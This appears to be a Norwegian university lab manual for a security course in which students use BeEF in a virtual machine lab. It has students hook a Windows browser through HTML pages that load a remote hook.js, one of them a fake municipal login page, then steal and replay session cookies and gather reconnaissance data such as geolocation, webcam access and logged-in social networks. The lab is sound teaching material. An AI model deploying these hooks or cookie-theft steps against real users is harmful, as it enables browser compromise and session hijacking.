# Lab Manual: BeeF Grunnleggende Oppgaver

**NTNU - Datasikkerhet**  
**Bachelor Digital infrastruktur og cybersikkerhet**

---

## 📋 Innhold

- [Før du starter](#før-du-starter)
- [Oppgave 1: First Hook](#oppgave-1-first-hook-)
- [Oppgave 2: Cookie Monster](#oppgave-2-cookie-monster-)
- [Oppgave 3: Browser Detective](#oppgave-3-browser-detective-)
- [Innlevering](#innlevering)

---

## Før du starter

### ✅ Forutsetninger

- [ ] Kali Linux VM kjører (RDP eller SSH tilgjengelig)
- [ ] Windows 11 VM kjører
- [ ] Begge VMs er på samme nettverk (192.168.111.0/24)
- [ ] BeeF er installert på Kali (`which beef-xss` gir output)
- [ ] Du har notert IP-adressene til begge maskinene

### 📝 Finn IP-adresser

**På Kali Linux: MERK! For å lime inn kommandoene fra Mac til Kali Linux måtte jeg benytte ctrl+shift+v**

```bash
ip addr show | grep "inet 192"
```
![alt text](img/showIPkali.pngs)
Noter IP-adressen (f.eks. `192.168.111.102`)

**På Windows 11:**
```cmd
ipconfig
```
Noter IP-adressen (f.eks. `192.168.111.103`)

### 📂 Lag arbeidsmappe

På Kali, opprett en mappe for labøvelsene. Kjør følgende kommando i terminalen, og endre deretter til beef-lab som stående mappe i terminalen:
```bash
mkdir -p ~/beef-lab
cd ~/beef-lab
```
![alt text](img/beeflab-folder.png)
---

# Oppgave 1: First Hook 🎣

**Tidsestimat:** 20-30 minutter  
**Vanskelighetsgrad:** ⭐ Lett  
**Læringsmål:**
- Forstå hvordan XSS fungerer
- Kjenne til BeeF's arkitektur
- Kunne hooke en nettleser
- Forstå hook-mekanismen

---

## Steg 1: Start BeeF

### 1.1 Koble til Kali via RDP eller SSH

**Via RDP:**
- Åpne RDP-klient
- Koble til Kali IP på port 3389
- Login: `student` / `Kali2025`

**Via SSH:**
```bash
ssh student@<KALI-IP>
```

### 1.2 Start BeeF service

Åpne Terminal på Kali og kjør:
```bash
sudo beef-xss
```

**Forventet output:**
```
[*] Browser Exploitation Framework (BeEF)
[*] Please wait as BeEF services start.
...
[13:37:00][*] RESTful API: http://127.0.0.1:3000/api/admin
[13:37:00][*] Web UI: http://127.0.0.1:3000/ui/panel
[13:37:00][*] BeEF server started (press control+c to stop)
```

**Viktig:** Noter Hook URL-en som vises:
```
Hook URL: http://192.168.111.XXX:3000/hook.js
```

> ⚠️ **La denne terminalen stå åpen!** Hvis du lukker den, stopper BeeF.

---

## Steg 2: Åpne BeeF Web UI

### 2.1 Åpne Firefox på Kali

- Klikk på Applications → Firefox ESR
- Eller trykk terminal: `firefox &`

### 2.2 Gå til BeeF UI

I Firefox, gå til:
```
http://127.0.0.1:3000/ui/panel
```

### 2.3 Logg inn

**Brukernavn:** `beef`  
**Passord:** `beef`

**Etter innlogging skal du se:**
- **Hooked Browsers** (venstre panel) - tom foreløpig
- **Current Browser** (midten) - ingen valgt enda
- **Commands** (høyre panel) - tom

> 📸 **Screenshot 1:** Ta et bilde av BeeF UI uten hooked browsers

---

## Steg 3: Lag en enkel HTML-side med BeeF hook

### 3.1 Opprett HTML-fil

I terminal på Kali:
```bash
cd ~/beef-lab
nano index.html
```

### 3.2 Lim inn følgende HTML-kode

**⚠️ VIKTIG:** Bytt ut `192.168.111.XXX` med din Kali IP-adresse!

```html
<!DOCTYPE html>
<html lang="no">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Velkommen til Kåres Kaffebar</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            max-width: 800px;
            margin: 50px auto;
            padding: 20px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
        }
        .container {
            background: rgba(255, 255, 255, 0.1);
            padding: 30px;
            border-radius: 10px;
            backdrop-filter: blur(10px);
        }
        h1 {
            text-align: center;
            font-size: 2.5em;
            margin-bottom: 20px;
        }
        .menu {
            background: rgba(255, 255, 255, 0.2);
            padding: 20px;
            border-radius: 5px;
            margin-top: 20px;
        }
        .menu-item {
            padding: 10px 0;
            border-bottom: 1px solid rgba(255, 255, 255, 0.3);
        }
        .price {
            float: right;
            font-weight: bold;
        }
        button {
            background: #ff6b6b;
            color: white;
            border: none;
            padding: 15px 30px;
            font-size: 1.2em;
            border-radius: 5px;
            cursor: pointer;
            margin-top: 20px;
            width: 100%;
        }
        button:hover {
            background: #ff5252;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>☕ Kåres Kaffebar ☕</h1>
        <p>Velkommen til byens koseligste kaffebar! Her får du den beste kaffen i Trondheim.</p>
        
        <div class="menu">
            <h2>Dagens Meny</h2>
            <div class="menu-item">
                Espresso <span class="price">35 kr</span>
            </div>
            <div class="menu-item">
                Cappuccino <span class="price">45 kr</span>
            </div>
            <div class="menu-item">
                Latte <span class="price">45 kr</span>
            </div>
            <div class="menu-item">
                Americano <span class="price">40 kr</span>
            </div>
            <div class="menu-item">
                Kanelbolle <span class="price">30 kr</span>
            </div>
        </div>
        
        <button onclick="alert('Takk for din bestilling! Vi kontakter deg snart.')">
            Bestill nå!
        </button>
        
        <p style="margin-top: 30px; text-align: center; font-size: 0.9em;">
            📍 Adresse: Innherredsveien 42, Trondheim<br>
            ⏰ Åpningstider: Man-Fre 07:00-18:00<br>
            📞 Telefon: 73 12 34 56
        </p>
    </div>

    <!-- BeeF Hook - BYTT UT IP-ADRESSEN! -->
    <script src="http://192.168.111.XXX:3000/hook.js"></script>
</body>
</html>
```

### 3.3 Lagre filen

- Trykk `Ctrl + O` (lagre)
- Trykk `Enter` (bekreft filnavn)
- Trykk `Ctrl + X` (avslutt)

### 3.4 Verifiser at filen er opprettet

```bash
ls -lh index.html
cat index.html | grep hook.js
```

Du skal se linjen med BeeF hook.

---

## Steg 4: Start en webserver

### 4.1 Start Python webserver

I samme mappe (`~/beef-lab`):
```bash
python3 -m http.server 8080
```

**Forventet output:**
```
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
```

> ⚠️ **La denne terminalen også stå åpen!**

### 4.2 Test at websiden fungerer

Åpne en **ny terminal** på Kali og kjør:
```bash
curl http://127.0.0.1:8080
```

Du skal se HTML-koden fra `index.html`.

---

## Steg 5: Hooke Windows 11 nettleseren

### 5.1 Koble til Windows 11

- Åpne RDP-klient på din lokale maskin
- Koble til Windows 11 IP på port 3389

### 5.2 Åpne nettleser på Windows 11

- Start Microsoft Edge eller Chrome
- Gå til adressen:
  ```
  http://192.168.111.XXX:8080
  ```
  (Bytt XXX med din Kali IP!)

### 5.3 Se at siden lastes

Du skal nå se "Kåres Kaffebar" siden i Windows nettleseren.

**Fra brukerens perspektiv:**
- Alt ser normalt ut
- Ingen advarsler
- Siden fungerer som vanlig

**Men i bakgrunnen:**
- `hook.js` ble lastet
- Nettleseren koblet til BeeF
- Nettleseren er nå "hooked"!

---

## Steg 6: Verifiser hooked browser i BeeF

### 6.1 Gå tilbake til BeeF UI på Kali

Bytt til Firefox-vinduet med BeeF UI (eller refresh siden).

### 6.2 Se etter den hooked nettleseren

I **Hooked Browsers** panelet (venstre side) skal du nå se:

```
Online Browsers (1)
  └── 🌐 192.168.111.103
        Edge 120.0 (Windows 11)
```

> 🎉 **Gratulerer! Du har hooked din første browser!**

> 📸 **Screenshot 2:** Ta et bilde av BeeF med hooked browser

### 6.3 Klikk på den hooked nettleseren

Du skal nå se detaljert informasjon:
- **IP-adresse**
- **Operativsystem** (Windows 11)
- **Nettleser** (Edge/Chrome versjon)
- **Skjermoppløsning**
- **Plugins**
- **Cookie-status**

---

## Steg 7: Test grunnleggende kommandoer

### 7.1 Velg "Commands" fanen

I høyre panel, klikk på **Commands**.

### 7.2 Kjør "Create Alert Dialog"

1. Ekspander **Browser → Hooked Domain**
2. Finn kommandoen **Create Alert Dialog**
3. Klikk på den
4. I tekst-feltet, skriv: `Hei fra BeeF!`
5. Klikk **Execute**

### 7.3 Se resultatet på Windows 11

Bytt til Windows 11 nettleseren. Du skal se en alert-boks med teksten:
```
Hei fra BeeF!
```

> 📸 **Screenshot 3:** Ta et bilde av alert-boksen på Windows

### 7.4 Se kommando-resultatet i BeeF

I BeeF UI:
1. Klikk på **History** fanen
2. Du skal se kommandoen du kjørte
3. Status: **Success** (grønn)

---

## Steg 8: Analyser hva som skjedde

### 8.1 Se på nettverk-trafikk (valgfritt)

På Windows 11, åpne Developer Tools:
- Trykk `F12`
- Gå til **Network** fanen
- Refresh siden
- Se etter requests til `hook.js` og polling til BeeF-serveren

### 8.2 Forstå mekanismen

**Hva skjedde teknisk?**

1. **HTML-siden lastet inn** `hook.js` fra BeeF-serveren
2. **JavaScript-koden i hook.js:**
   - Registrerte nettleseren hos BeeF
   - Startet en "polling loop" (ber om nye kommandoer hvert 5. sekund)
3. **BeeF-serveren:**
   - Lagret informasjon om nettleseren
   - Venter på kommandoer fra deg
4. **Når du kjører en kommando:**
   - BeeF sender JavaScript-kode til nettleseren
   - Nettleseren kjører koden
   - Resultatet sendes tilbake til BeeF

**Dette er XSS (Cross-Site Scripting) i aksjon!**

---

## Leveranse for Oppgave 1

### 📄 Lag en rapport (Markdown eller PDF)

**Filnavn:** `Oppgave1_FirstHook_[DittNavn].md`

**Innhold:**

```markdown
# Oppgave 1: First Hook

**Student:** [Ditt navn]
**Dato:** [Dato]

## 1. Screenshots

### Screenshot 1: BeeF UI før hooking
[Lim inn bilde]

### Screenshot 2: BeeF med hooked browser
[Lim inn bilde]

### Screenshot 3: Alert dialog på Windows
[Lim inn bilde]

## 2. IP-adresser brukt

- Kali Linux: 192.168.111.XXX
- Windows 11: 192.168.111.XXX
- BeeF Hook URL: http://192.168.111.XXX:3000/hook.js

## 3. Hva skjedde teknisk?

[Forklar med egne ord hva som skjedde når Windows-nettleseren lastet siden]

Steg for steg:
1. Windows nettleser lastet index.html fra Kali webserver
2. HTML-filen inkluderte hook.js fra BeeF serveren
3. hook.js registrerte nettleseren hos BeeF
4. ...

## 4. Sikkerhetsperspektiv

### 4.1 Angriper-perspektiv
Hva kan en angriper gjøre med en hooked browser?
[Dine tanker]

### 4.2 Forsvar-perspektiv
Hvordan kan en bruker beskytte seg mot dette?
[Dine tanker]

## 5. Refleksjon

Hva lærte du av denne oppgaven?
[Dine refleksjoner]
```

---

## ❓ Feilsøking Oppgave 1

### Problem: BeeF starter ikke

**Løsning:**
```bash
# Sjekk om port 3000 er i bruk
sudo netstat -tuln | grep 3000

# Hvis opptatt, drep prosessen
sudo fuser -k 3000/tcp

# Start BeeF på nytt
sudo beef-xss
```

### Problem: Nettleseren blir ikke hooked

**Sjekk:**
1. Er BeeF fortsatt i gang? (Se terminal-vinduet)
2. Er IP-adressen riktig i HTML-filen?
3. Kjører webserveren? (Se terminal)
4. Kan Windows nå Kali? Test: `ping 192.168.111.XXX` fra Windows

**Debug:**
```bash
# På Kali, se BeeF logger
sudo journalctl -u beef -f

# Se webserver logger
# (Se terminalen der python webserver kjører)
```

### Problem: Kan ikke nå websiden fra Windows

**Løsning:**
```bash
# Sjekk firewall på Kali
sudo ufw status

# Hvis aktiv, tillat port 8080
sudo ufw allow 8080/tcp

# Test at port er åpen
sudo netstat -tuln | grep 8080
```

---

# Oppgave 2: Cookie Monster 🍪

**Tidsestimat:** 20-30 minutter  
**Vanskelighetsgrad:** ⭐⭐ Middels  
**Læringsmål:**
- Forstå cookies og session management
- Kjenne til HttpOnly cookies
- Kunne stjele cookies med BeeF
- Forstå sikkerhetimplikasjoner

---

## Introduksjon

I denne oppgaven skal du stjele cookies fra en hooked nettleser. Cookies brukes ofte til session management - hvis en angriper stjeler en session cookie, kan de "late som" de er innlogget som offeret!

---

## Steg 1: Forberedelse

### 1.1 Sørg for at BeeF kjører

Fra Oppgave 1 skal du fortsatt ha:
- ✅ BeeF kjørende
- ✅ Webserver kjørende
- ✅ Windows 11 nettleser hooked

Hvis ikke, gå tilbake til Oppgave 1 og start tjenestene igjen.

---

## Steg 2: Lag en side med cookies

### 2.1 Opprett en ny HTML-fil med cookies

På Kali:
```bash
cd ~/beef-lab
nano cookies-demo.html
```

### 2.2 Lim inn følgende kode

**⚠️ Husk å endre IP-adressen!**

```html
<!DOCTYPE html>
<html lang="no">
<head>
    <meta charset="UTF-8">
    <title>Innlogging - Trondheim Kommune Portal</title>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%);
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .login-container {
            background: white;
            padding: 40px;
            border-radius: 10px;
            box-shadow: 0 10px 25px rgba(0,0,0,0.2);
            max-width: 400px;
            width: 100%;
        }
        .logo {
            text-align: center;
            margin-bottom: 30px;
        }
        h1 {
            color: #1e3c72;
            margin: 0;
            font-size: 1.8em;
        }
        .subtitle {
            color: #666;
            font-size: 0.9em;
            margin-top: 5px;
        }
        input {
            width: 100%;
            padding: 12px;
            margin: 10px 0;
            border: 1px solid #ddd;
            border-radius: 5px;
            box-sizing: border-box;
            font-size: 1em;
        }
        button {
            width: 100%;
            padding: 12px;
            background: #1e3c72;
            color: white;
            border: none;
            border-radius: 5px;
            font-size: 1.1em;
            cursor: pointer;
            margin-top: 10px;
        }
        button:hover {
            background: #2a5298;
        }
        .info {
            background: #e3f2fd;
            padding: 15px;
            border-radius: 5px;
            margin-top: 20px;
            border-left: 4px solid #2196F3;
        }
        .cookie-info {
            font-size: 0.85em;
            color: #666;
            margin-top: 15px;
            padding: 10px;
            background: #f5f5f5;
            border-radius: 5px;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="logo">
            <h1>🏛️ Trondheim Kommune</h1>
            <p class="subtitle">Ansattportal - Sikker pålogging</p>
        </div>

        <form id="loginForm">
            <input type="text" id="username" placeholder="Brukernavn" required>
            <input type="password" id="password" placeholder="Passord" required>
            <button type="submit">Logg inn</button>
        </form>

        <div class="info" id="status" style="display:none;">
            ✅ Du er nå innlogget som <strong id="loggedInUser"></strong>
        </div>

        <div class="cookie-info">
            🍪 Cookies lagret i nettleseren:<br>
            <span id="cookieDisplay">Ingen cookies enda</span>
        </div>
    </div>

    <script>
        // Simuler innlogging og sett cookies
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            
            if (username && password) {
                // Sett forskjellige typer cookies
                
                // 1. Normal session cookie (kan stjeles med BeeF)
                document.cookie = "sessionID=abc123def456ghi789; path=/";
                
                // 2. User preference cookie
                document.cookie = "username=" + username + "; path=/; max-age=31536000";
                
                // 3. Auth token (dette er den "verdifulle")
                document.cookie = "authToken=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9; path=/";
                
                // 4. HttpOnly cookie (kan IKKE stjeles med JavaScript)
                // Merk: Dette må egentlig settes av server, men vi simulerer
                document.cookie = "secureSession=xyz789abc123; path=/; HttpOnly";
                
                // Vis innlogget status
                document.getElementById('status').style.display = 'block';
                document.getElementById('loggedInUser').textContent = username;
                
                // Vis cookies
                displayCookies();
                
                // Skjul login-form
                document.getElementById('loginForm').style.display = 'none';
            }
        });
        
        function displayCookies() {
            const cookies = document.cookie;
            if (cookies) {
                document.getElementById('cookieDisplay').innerHTML = 
                    cookies.split('; ').map(c => '• ' + c).join('<br>');
            }
        }
        
        // Vis eksisterende cookies ved lasting
        displayCookies();
    </script>

    <!-- BeeF Hook - BYTT UT IP-ADRESSEN! -->
    <script src="http://192.168.111.XXX:3000/hook.js"></script>
</body>
</html>
```

Lagre filen (`Ctrl+O`, Enter, `Ctrl+X`).

---

## Steg 3: Test cookie-siden

### 3.1 Åpne siden på Windows 11

I Windows nettleseren, gå til:
```
http://192.168.111.XXX:8080/cookies-demo.html
```

### 3.2 "Logg inn" på siden

- Brukernavn: `ola.nordmann`
- Passord: `hemmelig123`
- Klikk "Logg inn"

Du skal nå se:
- "✅ Du er nå innlogget som ola.nordmann"
- En liste over cookies som ble satt

> 📸 **Screenshot 4:** Ta bilde av innlogget side med cookies

---

## Steg 4: Stjel cookies med BeeF

### 4.1 Gå til BeeF UI

I Firefox på Kali, verifiser at Windows-nettleseren fortsatt er hooked.

### 4.2 Kjør "Get Cookie" kommando

1. Klikk på den hooked nettleseren
2. Gå til **Commands** fanen
3. Ekspander **Browser → Hooked Domain**
4. Finn kommandoen **Get Cookie**
5. Klikk på den
6. Klikk **Execute**

### 4.3 Se resultatene

1. Gå til **History** fanen (eller **Module Results History**)
2. Klikk på "Get Cookie" kommandoen
3. Du skal nå se alle cookies:

```
Cookies:
sessionID=abc123def456ghi789
username=ola.nordmann
authToken=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9
```

> 📸 **Screenshot 5:** Ta bilde av stjålne cookies i BeeF

---

## Steg 5: Forstå resultatene

### 5.1 Analyser cookie-typer

**Cookies du fikk:**
- ✅ `sessionID` - Session cookie (kan stjeles)
- ✅ `username` - Preference cookie (kan stjeles)
- ✅ `authToken` - Auth token (kan stjeles)
- ❌ `secureSession` - HttpOnly cookie (**IKKE** synlig for JavaScript!)

### 5.2 Hvorfor er dette farlig?

Med stjålne cookies kan en angriper:
1. **Session hijacking** - Overta brukerens sesjon
2. **Impersonation** - Late som de er innlogget som brukeren
3. **Data theft** - Få tilgang til brukerens data
4. **Privilege escalation** - Hvis brukeren har admin-rettigheter

---

## Steg 6: Utfordringsoppgave - Test med ekte nettside

### 6.1 Gå til en test-nettside

På Windows 11, med **samme hooked nettleser**, gå til:
```
http://testphp.vulnweb.com
```

Dette er en **bevisst sårbar** testside for sikkerhetstesting.

### 6.2 Logg inn på testsiden

1. Klikk på "login" (øverst til høyre)
2. Brukernavn: `test`
3. Passord: `test`
4. Logg inn

### 6.3 Stjel cookies fra denne siden

I BeeF:
1. Kjør **Get Cookie** igjen
2. Se hvilke cookies testphp.vulnweb.com setter
3. Noter at noen kan inneholde session-informasjon

> 📸 **Screenshot 6:** Stjålne cookies fra testphp.vulnweb.com

---

## Steg 7: Demonstrer cookie-reuse (avansert)

### 7.1 Eksporter cookies fra BeeF

Kopier cookie-strengen fra BeeF (f.eks. `sessionID=abc123...`).

### 7.2 Manuelt sette cookies i en annen nettleser

På **Kali Linux**, åpne en **ny inkognito/private** Firefox-tab:

1. Gå til samme side: `http://192.168.111.XXX:8080/cookies-demo.html`
2. Åpne Developer Tools (`F12`)
3. Gå til **Console** fanen
4. Skriv inn:
   ```javascript
   document.cookie = "sessionID=abc123def456ghi789; path=/";
   document.cookie = "username=ola.nordmann; path=/";
   document.cookie = "authToken=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9; path=/";
   ```
5. Refresh siden

**Resultat:** Du har nå samme cookies som "offeret" og kan potensielt overta sesjonen!

---

## Leveranse for Oppgave 2

### 📄 Rapport

**Filnavn:** `Oppgave2_CookieMonster_[DittNavn].md`

**Innhold:**

```markdown
# Oppgave 2: Cookie Monster

**Student:** [Ditt navn]
**Dato:** [Dato]

## 1. Screenshots

### Screenshot 4: Innlogget side med cookies
[Lim inn]

### Screenshot 5: Stjålne cookies i BeeF
[Lim inn]

### Screenshot 6: Cookies fra testphp.vulnweb.com
[Lim inn]

## 2. Cookies stjålet

### Fra cookies-demo.html:
- sessionID: abc123...
- username: ola.nordmann
- authToken: eyJ...

### Fra testphp.vulnweb.com:
[Liste over cookies]

## 3. Hva er HttpOnly cookies?

[Forklar med egne ord]

HttpOnly cookies er...

## 4. Hvorfor kunne ikke HttpOnly cookie stjeles?

[Forklar]

## 5. Sikkerhetstiltak

### Hvordan kan en utvikler beskytte cookies?

1. HttpOnly flag: ...
2. Secure flag: ...
3. SameSite attribute: ...
4. ...

### Hvordan kan en bruker beskytte seg?

1. ...
2. ...
3. ...

## 6. Real-world scenario

Beskriv et realistisk scenario hvor cookie-tyving kan brukes i et angrep:

[Ditt scenario]

## 7. Refleksjon

Hva lærte du om cookies og session management?
[Dine tanker]
```

---

## ❓ Feilsøking Oppgave 2

### Problem: Ingen cookies vises i BeeF

**Løsning:**
1. Sjekk at du faktisk "logget inn" på cookies-demo siden
2. Sjekk at siden er hooked (grønn i BeeF)
3. Prøv å kjøre Get Cookie flere ganger
4. Se i BeeF terminal for feilmeldinger

### Problem: HttpOnly cookie vises likevel

**Forklaring:**
HttpOnly cookies **kan ikke settes via JavaScript** i nettleseren. I vår demo simulerer vi bare at den eksisterer. I en ekte applikasjon ville serveren satt HttpOnly-flagget, og da ville cookien **IKKE** være synlig for `document.cookie` eller BeeF.

---

# Oppgave 3: Browser Detective 🕵️

**Tidsestimat:** 30-40 minutter  
**Vanskelighetsgrad:** ⭐⭐ Middels  
**Læringsmål:**
- Forstå browser fingerprinting
- Kjenne til informasjonslekasje
- Kunne samle reconnaissance data
- Forstå privacy-implikasjoner

---

## Introduksjon

I denne oppgaven skal du samle **så mye informasjon som mulig** om målsystemet (Windows 11 VM) kun ved å bruke BeeF. Dette kalles **reconnaissance** eller **information gathering** - første fase i et angrep.

---

## Steg 1: Forberedelse

### 1.1 Sørg for aktiv hook

Fra tidligere oppgaver:
- ✅ BeeF kjører
- ✅ Windows 11 nettleser er hooked

Hvis ikke, gå til `http://192.168.111.XXX:8080` fra Windows.

### 1.2 Opprett en rapport-template

På Kali:
```bash
cd ~/beef-lab
nano reconnaissance-report.txt
```

Lim inn:
```
==============================================
RECONNAISSANCE RAPPORT
Target: Windows 11 VM
Dato: [DATO]
==============================================

1. SYSTEM INFORMASJON
------------------------------


2. NETTLESER INFORMASJON
------------------------------


3. NETTVERK INFORMASJON
------------------------------


4. INSTALLERTE PLUGINS/EXTENSIONS
------------------------------


5. SOSIALE MEDIER
------------------------------


6. BROWSER KAPABILITETER
------------------------------


7. SIKKERHETSSTATUS
------------------------------


==============================================
```

Lagre (`Ctrl+O`, Enter, `Ctrl+X`).

---

## Steg 2: Samle system-informasjon

### 2.1 Get System Info

I BeeF UI:
1. Velg hooked browser
2. **Commands** → **Host** → **Get System Info**
3. Klikk **Execute**
4. Gå til **History** → Se resultater

**Informasjon du får:**
- ✅ Operating System
- ✅ Platform
- ✅ Browser Type & Version
- ✅ User Agent String

> 📸 **Screenshot 7:** System Info resultater

**Fyll inn i rapport:**
```
1. SYSTEM INFORMASJON
------------------------------
OS: Windows 11
Platform: Win32
Browser: Edge 120.0.6099.199
User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)...
```

### 2.2 Detect Software

**Commands** → **Host** → **Detect Software**

Dette sjekker for vanlig software som:
- Adobe Reader
- Java
- Flash (deprecated)
- QuickTime
- VLC
- etc.

Noter hvilken software som er installert.

---

## Steg 3: Samle nettleser-informasjon

### 3.1 Get Browser Plugins

**Commands** → **Browser** → **Hooked Domain** → **Get Plugins**

**Informasjon:**
- Installerte browser plugins
- Versjoner
- MIME types støttet

### 3.2 Get Cookie

Vi gjorde dette i Oppgave 2, men kjør igjen for å se alle cookies på aktiv side.

### 3.3 Get Browser Extensions (Chrome/Edge)

Prøv å detektere extensions:

**Manuelt via Console i BeeF:**

Noen BeeF-moduler kan detektere populære extensions som:
- AdBlock
- LastPass
- Grammarly
- etc.

---

## Steg 4: Samle nettverk-informasjon

### 4.1 Get Internal IP

**Commands** → **Network** → **Get Internal IP**

Dette bruker WebRTC for å finne:
- Intern IP-adresse (192.168.111.XXX)
- Mulige andre nettverksinterfaces

> 📸 **Screenshot 8:** Internal IP resultater

### 4.2 Detect NAT (valgfritt)

**Commands** → **Network** → **Detect NAT**

Sjekker om maskinen er bak NAT/firewall.

### 4.3 DNS Enumeration

**Commands** → **Network** → **DNS Tunnel**

Prøv å gjøre DNS lookups for å finne:
- Interne domenenavn
- Nettverksstruktur

---

## Steg 5: Sosiale medier

### 5.1 Detect Social Networks

**Commands** → **Social Engineering** → **Detect Social Networks**

Dette sjekker om brukeren er innlogget på:
- Facebook
- Twitter/X
- LinkedIn
- Instagram
- TikTok
- Reddit
- etc.

**Hvordan fungerer det?**
BeeF prøver å laste ressurser fra disse nettstedene. Hvis brukeren er innlogget, vil ressursene laste suksessfullt.

> 📸 **Screenshot 9:** Social Networks resultater

### 5.2 Get Facebook Name (hvis innlogget)

Hvis Facebook er detektert som "logged in":

**Commands** → **Social Engineering** → **Get Facebook Name**

Dette kan hente brukerens Facebook-navn!

---

## Steg 6: Test browser-kapabiliteter

### 6.1 Detect Webcam

**Commands** → **Browser** → **Webcam Permission**

**MERK:** Dette vil be om tillatelse i Windows nettleseren!

Se om brukeren tillater webcam-tilgang (trykk **Tillat** på Windows for å teste).

### 6.2 Detect Microphone

Samme som webcam, men for mikrofon.

### 6.3 Get Geolocation

**Commands** → **Browser** → **Get Geolocation**

Be om tillatelse til lokasjon.

Hvis tillatt, får du:
- Latitude
- Longitude
- Accuracy
- Altitude (hvis tilgjengelig)

> 📸 **Screenshot 10:** Geolocation resultater

### 6.4 Detect Google Maps

Sjekk om browser har tilgang til Google Maps API.

---

## Steg 7: Sikkerhetsstatus

### 7.1 Detect CORS

**Commands** → **Network** → **CORS**

Test om browser enforcer CORS (Cross-Origin Resource Sharing).

### 7.2 Detect XSS Auditor

Noen nettlesere har innebygd XSS-beskyttelse. Test om den er aktiv.

### 7.3 Detect Do Not Track

Sjekk om "Do Not Track" er aktivert i nettleseren:

```javascript
navigator.doNotTrack
```

---

## Steg 8: Samle alt i en profil

### 8.1 Fyll ut reconnaissance-rapporten

Basert på all informasjon samlet, fyll ut rapporten:

```
==============================================
RECONNAISSANCE RAPPORT
Target: Windows 11 VM
Dato: 15. Oktober 2025
==============================================

1. SYSTEM INFORMASJON
------------------------------
OS: Windows 11 Pro (Build 22621)
Platform: Win64
Browser: Microsoft Edge 120.0.6099.199
User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36...
Screen Resolution: 1920x1080
Language: nb-NO (Norwegian)
Timezone: Europe/Oslo (UTC+1)

2. NETTLESER INFORMASJON
------------------------------
Browser Engine: Chromium
JavaScript Enabled: Yes
Cookies Enabled: Yes
Java Enabled: No
Flash Enabled: No
Plugins Detected:
  - PDF Viewer (built-in)
  - Chromium PDF Plugin

3. NETTVERK INFORMASJON
------------------------------
Internal IP: 192.168.111.103
External IP: 10.212.174.252 (via NTNU)
NAT Detected: Yes
DNS Servers: 192.168.111.1

4. INSTALLERTE PLUGINS/EXTENSIONS
------------------------------
- None detected (default Edge installation)

5. SOSIALE MEDIER
------------------------------
Logged into:
  - Facebook: No
  - LinkedIn: No
  - Twitter: No
  - Reddit: No

6. BROWSER KAPABILITETER
------------------------------
WebRTC: Enabled
Webcam: Available (permission required)
Microphone: Available (permission required)
Geolocation: Available (permission required)
Local Storage: Enabled
Session Storage: Enabled
IndexedDB: Supported

7. SIKKERHETSSTATUS
------------------------------
CORS: Enforced
XSS Auditor: Enabled (Chromium built-in)
Do Not Track: Not Set
HTTPS: Not enforced
Content Security Policy: Not detected
```

---

## Steg 9: Visualiser dataen

### 9.1 Lag et "Target Profile" dokument

På Kali, lag en ny HTML-side som visualiserer funnene:

```bash
cd ~/beef-lab
nano target-profile.html
```

Lim inn:

```html
<!DOCTYPE html>
<html>
<head>
    <title>Target Profile: Windows 11 VM</title>
    <style>
        body {
            font-family: 'Courier New', monospace;
            background: #0a0a0a;
            color: #00ff00;
            padding: 20px;
            max-width: 1200px;
            margin: 0 auto;
        }
        h1 {
            color: #ff0000;
            text-align: center;
            border: 2px solid #ff0000;
            padding: 10px;
        }
        .section {
            border: 1px solid #00ff00;
            padding: 15px;
            margin: 20px 0;
            background: #1a1a1a;
        }
        .section h2 {
            color: #00ffff;
            margin-top: 0;
        }
        .vuln {
            color: #ff9900;
            font-weight: bold;
        }
        table {
            width: 100%;
            border-collapse: collapse;
        }
        td {
            padding: 8px;
            border-bottom: 1px solid #333;
        }
        td:first-child {
            width: 30%;
            color: #00ffff;
        }
        .risk-high { color: #ff0000; }
        .risk-medium { color: #ff9900; }
        .risk-low { color: #ffff00; }
    </style>
</head>
<body>
    <h1>🎯 TARGET RECONNAISSANCE PROFILE 🎯</h1>
    
    <div class="section">
        <h2>📋 SYSTEM OVERVIEW</h2>
        <table>
            <tr>
                <td>Operating System:</td>
                <td>Windows 11 Pro (Build 22621)</td>
            </tr>
            <tr>
                <td>Browser:</td>
                <td>Microsoft Edge 120.0.6099.199 (Chromium)</td>
            </tr>
            <tr>
                <td>Internal IP:</td>
                <td>192.168.111.103</td>
            </tr>
            <tr>
                <td>Location:</td>
                <td>Trondheim, Norway (NTNU Network)</td>
            </tr>
        </table>
    </div>
    
    <div class="section">
        <h2>🔓 VULNERABILITIES IDENTIFIED</h2>
        <ul>
            <li class="risk-high vuln">XSS Vulnerable - BeeF hook successful</li>
            <li class="risk-high vuln">Cookies not marked HttpOnly</li>
            <li class="risk-medium vuln">WebRTC leaking internal IP</li>
            <li class="risk-medium vuln">No Content Security Policy detected</li>
            <li class="risk-low vuln">Do Not Track header not set</li>
        </ul>
    </div>
    
    <div class="section">
        <h2>🎯 ATTACK VECTORS</h2>
        <ol>
            <li><strong>Session Hijacking:</strong> Steal cookies via BeeF</li>
            <li><strong>Phishing:</strong> Deploy Pretty Theft module</li>
            <li><strong>Network Mapping:</strong> Use internal IP for lateral movement</li>
            <li><strong>Social Engineering:</strong> Craft targeted attacks based on browser/OS</li>
        </ol>
    </div>
    
    <div class="section">
        <h2>💡 RECOMMENDATIONS</h2>
        <ul>
            <li>Implement Content Security Policy (CSP)</li>
            <li>Set HttpOnly and Secure flags on all cookies</li>
            <li>Disable WebRTC or use VPN</li>
            <li>Install browser extensions (NoScript, uBlock Origin)</li>
            <li>Regular security updates</li>
        </ul>
    </div>
</body>
</html>
```

Åpne i browser: `firefox target-profile.html &`

